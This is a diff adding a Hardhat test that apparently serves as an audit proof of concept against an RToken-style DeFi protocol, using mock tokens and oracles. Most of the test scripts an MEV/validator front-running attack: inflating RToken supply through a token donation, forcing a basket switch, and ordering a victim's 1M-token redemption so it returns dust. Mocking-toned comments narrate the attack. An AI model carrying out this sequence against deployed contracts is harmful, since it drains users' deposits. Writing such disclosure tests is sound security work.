+                compChainlinkFeed.address,
+                ORACLE_ERROR,
+                shitToken2.address,
+                config.rTokenMaxTradeVolume,
+                ORACLE_TIMEOUT
+            )
+        )
+        await notSoShitAsset.refresh()
+
+        // Get assets and tokens
+        tokenAsset = <FiatCollateral>basket[0]
+        usdcAsset = <FiatCollateral>basket[1]
+        cTokenAsset = <CTokenFiatCollateral>basket[3]
+
+        token = <ERC20Mock>await ethers.getContractAt('ERC20Mock', await tokenAsset.erc20())
+        usdc = <USDCMock>await ethers.getContractAt('USDCMock', await usdcAsset.erc20())
+        cToken = <CTokenMock>await ethers.getContractAt('CTokenMock', await cTokenAsset.erc20())
+
+        // Deploy DFacadeWriteLib lib
+        const facadeWriteLib = await (await ethers.getContractFactory('FacadeWriteLib')).deploy()
+        facadeWriteLibAddr = facadeWriteLib.address
+
+        // Deploy Facade
+        const FacadeFactory: ContractFactory = await ethers.getContractFactory('PatrickFacadeWrite', {
+            libraries: {
+                FacadeWriteLib: facadeWriteLibAddr,
+            },
+        })
+        facadeWrite = <PatrickFacadeWrite>await FacadeFactory.deploy(deployer.address)
+
+        // const FacadeReadFactory: ContractFactory = await ethers.getContractFactory('FacadeRead')
+        // const facade = <FacadeRead>await FacadeReadFactory.deploy()
+
+        revShare1 = { rTokenDist: bn('2'), rsrDist: bn('3') } // 0.5% for beneficiary1
+        revShare2 = { rTokenDist: bn('4'), rsrDist: bn('6') } // 1% for beneficiary2
+
+        // Decrease revenue splits for nicer rounding
+        config.dist.rTokenDist = bn('394')
+        config.dist.rsrDist = bn('591')
+
+        // Set parameters
+        rTokenConfig = {
+            name: 'RTKN RToken',
+            symbol: 'RTKN',
+            mandate: 'mandate',
+            params: config,
+        }
+
+        rTokenSetup = {
+            assets: [shitAsset.address],
+            primaryBasket: [shitAsset.address],
+            weights: [fp('1')], // 1 RT = [1 shitAsset]
+            backups: [],
+            beneficiaries: [
+                { beneficiary: beneficiary1.address, revShare: revShare1 },
+                { beneficiary: beneficiary2.address, revShare: revShare2 },
+            ],
+        }
+
+        badBackupRTokenSetup = {
+            assets: [],
+            primaryBasket: [shitAsset.address], // target name is shit
+            weights: [fp('1')], // 1 RT = [1 shitAsset]
+            backups: [{
+                backupUnit: ethers.utils.formatBytes32String('shit'),
+                diversityFactor: bn('1'), // max
+                backupCollateral: [notSoShitAsset.address],
+            }],
+            beneficiaries: []
+        }
+
+        // Set governance params
+        govParams = {
+            votingDelay: bn(5), // 5 blocks
+            votingPeriod: bn(100), // 100 blocks
+            proposalThresholdAsMicroPercent: bn(1e6), // 1%
+            quorumPercent: bn(4), // 4%
+            timelockDelay: bn(60 * 60 * 24), // 1 day
+        }
+        rTokenSetup.beneficiaries = [
+            { beneficiary: beneficiary1.address, revShare: { rsrDist: bn(1), rTokenDist: bn(0) } },
+        ]
+        // Deploy RToken via FacadeWrite
+        const receipt = await (
+            await facadeWrite.connect(deployerUser).deployRToken(rTokenConfig, badBackupRTokenSetup)
+        ).wait()
+        // const rToken = <TestIRToken>await ethers.getContractAt('TestIRToken', await main.rToken())
+        const mainAddr = expectInIndirectReceipt(receipt, deployer.interface, 'RTokenCreated').args.main
+        main = <TestIMain>await ethers.getContractAt('TestIMain', mainAddr)
+        rToken = <TestIRToken>await ethers.getContractAt('TestIRToken', await main.rToken())
+        assetRegistry = <IAssetRegistry>(
+            await ethers.getContractAt('IAssetRegistry', await main.assetRegistry())
+        )
+
+        await assetRegistry.connect(deployerUser).register(shitAsset.address)
+
+        backingManager = <TestIBackingManager>(
+            await ethers.getContractAt('TestIBackingManager', await main.backingManager())
+        )
+        basketHandler = <IBasketHandler>(
+            await ethers.getContractAt('IBasketHandler', await main.basketHandler())
+        )
+
+        rsrTrader = <TestIRevenueTrader>(
+            await ethers.getContractAt('TestIRevenueTrader', await main.rsrTrader())
+        )
+        rTokenTrader = <TestIRevenueTrader>(
+            await ethers.getContractAt('TestIRevenueTrader', await main.rTokenTrader())
+        )
+
+        distributor = <TestIDistributor>(
+            await ethers.getContractAt('TestIDistributor', await main.distributor())
+        )
+
+        stRSR = <TestIStRSR>await ethers.getContractAt('TestIStRSR', await main.stRSR())
+        stkWithdrawalDelay = bn(await stRSR.unstakingDelay()).toString()
+
+        furnace = <TestIFurnace>await ethers.getContractAt('TestIFurnace', await main.furnace())
+        ERC20Factory = await ethers.getContractFactory('ERC20Mock')
+    })
+
+    context("When protocol is uncollateralized & collateral is sound", function () {
+        let tokenA: ERC20Mock
+        let tokenB: ERC20Mock
+        let tokenAAsset: FiatCollateral
+        let tokenBAsset: FiatCollateral
+        let mintBalance: BigNumber
+        let issueAmount: BigNumber
+
+        const printValues = async () => {
+            console.log("Addr1 tokenA balance: ", (await tokenA.balanceOf(addr1.address)).toString())
+            console.log("Addr1 tokenB balance: ", (await tokenB.balanceOf(addr1.address)).toString())
+            console.log("Addr1 rToken balance: ", (await rToken.balanceOf(addr1.address)).toString())
+
+            console.log("Addr2 tokenA balance: ", (await tokenA.balanceOf(addr2.address)).toString())
+            console.log("Addr2 tokenB balance: ", (await tokenB.balanceOf(addr2.address)).toString())
+            console.log("Addr2 rToken balance: ", (await rToken.balanceOf(addr2.address)).toString())
+
+            console.log("Addr3 tokenA balance: ", (await tokenA.balanceOf(addr3.address)).toString())
+            console.log("Addr3 tokenB balance: ", (await tokenB.balanceOf(addr3.address)).toString())
+            console.log("Addr3 rToken balance: ", (await rToken.balanceOf(addr3.address)).toString())
+            console.log("Addr3 rsr balance: ", (await rsr.balanceOf(addr3.address)).toString())
+
+            console.log("Protocol tokenA balance: ", (await tokenA.balanceOf(backingManager.address)).toString())
+            console.log("Protocol tokenB balance: ", (await tokenB.balanceOf(backingManager.address)).toString())
+            console.log("Protocol rToken balance: ", (await rToken.balanceOf(backingManager.address)).toString())
+
+            console.log("rTokenTrader tokenA balance: ", (await tokenA.balanceOf(rTokenTrader.address)).toString())
+            console.log("rTokenTrader tokenB balance: ", (await tokenB.balanceOf(rTokenTrader.address)).toString())
+            console.log("rTokenTrader rToken balance: ", (await rToken.balanceOf(rTokenTrader.address)).toString())
+
+            console.log("rsrTrader tokenA balance: ", (await tokenA.balanceOf(rsrTrader.address)).toString())
+            console.log("rsrTrader tokenB balance: ", (await tokenB.balanceOf(rsrTrader.address)).toString())
+            console.log("rsrTrader rToken balance: ", (await rToken.balanceOf(rsrTrader.address)).toString())
+
+            console.log("gnosis tokenA balance: ", (await tokenA.balanceOf(gnosis.address)).toString())
+            console.log("gnosis tokenB balance: ", (await tokenB.balanceOf(gnosis.address)).toString())
+            console.log("gnosis rToken balance: ", (await rToken.balanceOf(gnosis.address)).toString())
+
+            console.log("furnace tokenA balance: ", (await tokenA.balanceOf(furnace.address)).toString())
+            console.log("furnace tokenB balance: ", (await tokenB.balanceOf(furnace.address)).toString())
+            console.log("furnace rToken balance: ", (await rToken.balanceOf(furnace.address)).toString())
+
+            console.log("rtoken total supply: ", (await rToken.totalSupply()).toString())
+            console.log("Fully collateralized?: ", (await basketHandler.fullyCollateralized()).toString())
+        }
+
+        beforeEach(async function () {
+            const defaultThreshold = fp('0.05') // 5%
+            const delayUntilDefault = bn('86400') // 24h
+            const chainlinkFeed: MockV3Aggregator = <MockV3Aggregator>(
+                await MockV3AggregatorFactory.deploy(8, bn('1e8'))
+            )
+            tokenA = <ERC20Mock>await ERC20Factory.deploy("AToken", "AT")
+            const FiatCollateralFactory: ContractFactory = await ethers.getContractFactory('FiatCollateral')
+            tokenAAsset = <FiatCollateral>(
+                await FiatCollateralFactory.deploy(
+                    {
+                        priceTimeout: PRICE_TIMEOUT,
+                        chainlinkFeed: chainlinkFeed.address,
+                        oracleError: ORACLE_ERROR,
+                        erc20: tokenA.address, // tokenA is the collateral
+                        maxTradeVolume: config.rTokenMaxTradeVolume,
+                        oracleTimeout: ORACLE_TIMEOUT,
+                        targetName: ethers.utils.formatBytes32String('USD'),
+                        defaultThreshold: defaultThreshold,
+                        delayUntilDefault: delayUntilDefault,
+                    }
+                )
+            )
+            await assetRegistry.register(tokenAAsset.address)
+            tokenB = <ERC20Mock>await ERC20Factory.deploy("BToken", "BT")
+            tokenBAsset = <FiatCollateral>(
+                await FiatCollateralFactory.deploy(
+                    {
+                        priceTimeout: PRICE_TIMEOUT,
+                        chainlinkFeed: chainlinkFeed.address,
+                        oracleError: ORACLE_ERROR,
+                        erc20: tokenB.address, // tokenB is the collateral
+                        maxTradeVolume: config.rTokenMaxTradeVolume,
+                        oracleTimeout: ORACLE_TIMEOUT,
+                        targetName: ethers.utils.formatBytes32String('USD'),
+                        defaultThreshold: defaultThreshold,
+                        delayUntilDefault: delayUntilDefault,
+                    }
+                )
+            )
+            await assetRegistry.register(tokenBAsset.address)
+            await backingManager.connect(deployerUser).grantRTokenAllowance(tokenA.address)
+            await backingManager.connect(deployerUser).grantRTokenAllowance(tokenB.address)
+
+            // 2. Set prime basket to token A and have addr1 mint 10 tokens
+            await basketHandler.connect(deployerUser).setPrimeBasket([tokenA.address], [fp('1')])
+            await basketHandler.refreshBasket()
+            mintBalance = bn('10e18') // fast issue
+            await tokenA.connect(addr1).mint(addr1.address, mintBalance)
+            await tokenA.connect(addr1).approve(rToken.address, mintBalance)
+            issueAmount = mintBalance
+            await rToken.connect(addr1)['issue(uint256)'](issueAmount) // addr1 has 1 RToken, protocol has 1 tokenA
+
+            expect(await basketHandler.fullyCollateralized()).to.be.true
+            expect(await basketHandler.status()).to.equal(0) // sound collateral
+            expect(await rToken.balanceOf(addr1.address)).to.equal(issueAmount) // addr1 has 10 rTokens
+            expect(await tokenA.balanceOf(addr1.address)).to.equal(0) // addr1 has no tokenA since it's deposited
+            expect(await tokenB.balanceOf(addr1.address)).to.equal(0) // addr1 has no tokenB since they didn't mint
+        })
+        it('High: MEV bots can have users redeem for nothing', async () => {
+            // addr1 has a lot of money in the protocol 
+            const massiveMintBalance = bn('1000000e18') // 1M tokens! 
+            await tokenA.connect(addr1).mint(addr1.address, massiveMintBalance)
+            await tokenA.connect(addr1).approve(rToken.address, massiveMintBalance)
+            await rToken.connect(addr1)['issue(uint256)'](massiveMintBalance) // addr1 has 1M RToken, protocol has 1M tokenA
+            await advanceTime(120000)
+            await advanceBlocks(12000)
+            await rToken.connect(addr1).vest(addr1.address, 1)
+            // await printValues()
+            await basketHandler.connect(deployerUser).setBackupConfig(ethers.utils.formatBytes32String('USD'), '1', [tokenB.address])
+            // ya know what? I want to redeem those... Worst case it reverts if I redeem too much right? 
+            // AHAHAH YOU'RE ABOUT TO GET FK'D KID
+
+            // One of the assets is about to be no good, oh no! This means anyone can refresh the basket to the backup, and steal the money
+            // but our MEV bot sees this TX...
+            // This means tokenB is coming in hot on the next refresh
+
+            // addr1 would like to redeem their 10 tokenA, but they don't realize the protocol is about to switch basket
+            // so they send their TX to redeem their 1M tokenA, but oh no!!! an MEV bot got to them first!
+            // Since tokenA is bad collateral, now anyone can call this, even if it's for 1 block
+            // our attacker waits for some FOOL to redeem their tokens... AND FRONT RUN THEIR ASSSEESSSSSSSS
+            // This was their fatal mistake
+            await rToken.connect(addr1).approve(rToken.address, massiveMintBalance)
+            await tokenA.connect(addr2).mint(addr2.address, mintBalance)
+
+            // ****************************** // 
+            // EVIL VALIDATOR TXES START
+            // ****************************** // 
+            const evilAmount = mintBalance.div(100000)
+            const crazyAttackBalance = bn('5000000000e18') // 5B tokens!
+            await tokenA.connect(addr2).mint(addr2.address, crazyAttackBalance)
+            await tokenA.connect(addr2).transfer(backingManager.address, crazyAttackBalance)
+            // we explode the RToken supply so the user can redeem all their RTokens for almost nothing
+            const erc20sInRegistry = await assetRegistry.erc20s()
+            await backingManager.manageTokens(erc20sInRegistry) // mints 5B RToken, and sends them to revenue peeps
+            // await printValues()
+
+            // I added a setStatus function to simulate the asset going bad
+            await tokenAAsset.setStatus(2) // 2 = disabled
+            await assetRegistry.refresh()
+            await basketHandler.refreshBasket() // now we swap to tokenB
+            await tokenB.connect(addr2).mint(addr2.address, evilAmount)
+            await tokenB.connect(addr2).transfer(backingManager.address, evilAmount)
+            // ****************************** // 
+            // EVIL VALIDATOR TXES END
+            // ****************************** // 
+            // ****************************** // 
+            // EVIL VALIDATOR NOW ORDERS THE REDEMPTION TX
+            // ****************************** // 
+            // and our victim's TX goes through... get rekt!!!
+            await rToken.connect(addr1).redeem(massiveMintBalance.add(mintBalance)) // normally, this isn't possible, but we have fucked with the total supply!!
+            // Now we issue ourselves some RToken (we could also fast issue ourselves unlimited RToken using a similar exploit so we'd be the main RToken holders)
+            await tokenB.connect(addr2).mint(addr2.address, mintBalance)
+            await tokenB.connect(addr2).approve(rToken.address, mintBalance)
+            await rToken.connect(addr2)['issue(uint256)'](mintBalance)
+            // ******************************************************** // 
+            // The above TX is ordered after they exploit the attack
+            // And that's the attack in a nutshell, they redeemed 1M tokens for dust!!!
+            // ******************************************************** // 
+
+            // now... to get the attackers money back:
+            // 5,000,000,000.000000000000000000 rTokens are on the chopping block
+            await backingManager.manageTokens(erc20sInRegistry) // kicks off recollateralization now
+            // Do a ton of auctions
+            let amountTokenA = await tokenA.balanceOf(gnosis.address) // we need the origin address. 
+            let amountTokenB = amountTokenA
+            await tokenB.connect(addr3).mint(addr3.address, amountTokenB)
+            await tokenB.connect(addr3).approve(gnosis.address, amountTokenB)
+            await gnosis.connect(addr3).placeBid(0, {
+                bidder: addr3.address,
+                sellAmount: amountTokenA, // the whole thing
+                buyAmount: amountTokenB,
+            })
+            await advanceTime(config.auctionLength.add(100).toString())
+            await backingManager.settleTrade(tokenA.address)
+            // And after a ton of auctions, the original attacker will make most of their money back since they are the main RToken holders.
+            // They could whale into staking RSR too to get most of the RSR revenue
+        })
+    })
+})
```


